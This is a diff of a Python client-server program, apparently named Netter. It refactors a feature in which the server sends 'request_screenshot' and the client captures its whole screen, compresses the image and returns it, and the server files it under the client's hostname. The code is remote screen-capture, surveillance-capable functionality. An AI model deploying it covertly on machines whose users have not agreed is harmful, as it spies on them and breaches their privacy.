@@ -10,6 +10,8 @@ if typing.TYPE_CHECKING:
     from .bucket import ConnectionBucket
     from .sock import NetterServer
 
+from .modules import screenshot as modules_screenshot
+
 class ClientWrapper:
     def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
         self.connection: socket.socket = connection
@@ -38,6 +40,7 @@ class ServerHandler:
 
     This is where the client should do whatever the server sents
     """
+
     def __init__(self, server_address: tuple[str, int], deviceData: bytes, additionalData: dict) -> None:
         self.server_address: tuple = server_address
         self.isConnected: bool = False
@@ -89,20 +92,14 @@ class ServerHandler:
                     continue
 
             if (message.startswith(b'request_screenshot')):
-                try:
-                    screenshot = ImageGrab.grab()
-
-                except OSError:
-                    self.socketInstance.send_packet('screenshot_response not_available')
-                    continue
-
-                screenshot.save(img := io.BytesIO(), format = 'PNG')
-                data = zlib.compress(img.getvalue())
-
-                self.socketInstance.send_packet(b'screenshot_response ' + data)
+                modules_screenshot.run(self.socketInstance)
 
 class ClientHandler(threading.Thread):
-    def __init__(self, connection: 'ClientDevice', connectionAddress: tuple[str, int], connectionBucket: 'ConnectionBucket', NetterInstance: 'NetterServer') -> None:
+    def __init__(self, connection: 'ClientDevice',
+            connectionAddress: tuple[str, int],
+            connectionBucket: 'ConnectionBucket',
+            NetterInstance: 'NetterServer') -> None:
+
         threading.Thread.__init__(self)
 
         self.conneciton: 'ClientDevice' = connection
@@ -147,7 +144,7 @@ class ClientHandler(threading.Thread):
                     self.NetterInstance._waitingForResponse = False
                     continue
 
-                fileName: str = f'output/{self.conneciton.hostname}-{str(time.time())}.png'
+                fileName: str = f'responses/{self.conneciton.hostname}-{str(time.time())}.png'
                 screenImg: bytes = zlib.decompress(data[20:])
 
                 with open(fileName, 'wb') as file:
